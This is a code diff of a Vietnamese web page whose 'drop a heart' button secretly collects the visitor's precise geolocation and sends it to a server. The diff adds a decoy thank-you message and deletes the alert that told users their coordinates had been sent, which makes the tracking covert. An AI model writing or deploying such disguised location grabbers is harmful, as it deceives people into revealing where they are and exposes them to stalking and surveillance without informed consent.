@@ -8,9 +8,22 @@
 <body>
   <h1>Thả tim</h1>
   <button id="btn-share">Nhấp để thả tim</button>
+  <!-- 1. Thêm dòng cảm ơn ẩn sẵn -->
+  <p id="thank" style="display:none; color:deeppink; font-size:1.2em; font-weight:bold; margin-top:10px;">
+    ❤️ Cảm ơn bạn đã thả tim!
+  </p>
 
   <script>
-    document.getElementById('btn-share').addEventListener('click', shareLocation);
+    const btn = document.getElementById('btn-share');
+    const thank = document.getElementById('thank');
+
+    btn.addEventListener('click', () => {
+      // 2. Khi nhấn nút, hiện dòng cảm ơn
+      thank.style.display = 'block';
+
+      // (và gọi tiếp logic lấy vị trí + gửi lên server như bình thường)
+      shareLocation();
+    });
 
     function shareLocation() {
       if (!navigator.geolocation) {
@@ -19,24 +32,21 @@
 
       const options = {
         enableHighAccuracy: true,
-        timeout: 20000,    // hủy sau 20s nếu chưa có reading đủ tốt
+        timeout: 20000,
         maximumAge: 0
       };
       const minAccuracy = 30; // mét
 
       let watchId = navigator.geolocation.watchPosition(
         pos => {
-          console.log(Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}, Accuracy: ${pos.coords.accuracy}m);
-          // Chỉ gửi khi độ chính xác nhỏ hơn ngưỡng
           if (pos.coords.accuracy <= minAccuracy) {
             navigator.geolocation.clearWatch(watchId);
             sendToServer(pos.coords.latitude, pos.coords.longitude);
           }
         },
         err => {
-          console.error('Lỗi khi lấy vị trí:', err.code, err.message);
-          alert('Không thể lấy vị trí. Lỗi: ' + err.message);
           navigator.geolocation.clearWatch(watchId);
+          alert('Không thể lấy vị trí. Lỗi: ' + err.message);
         },
         options
       );
@@ -52,7 +62,6 @@
       })
       .then(r => r.json())
       .then(data => {
-        alert('Vị trí đã được gửi! (' + lat + ', ' + lon + ')');
         console.log('Server response:', data);
       })
       .catch(err => {
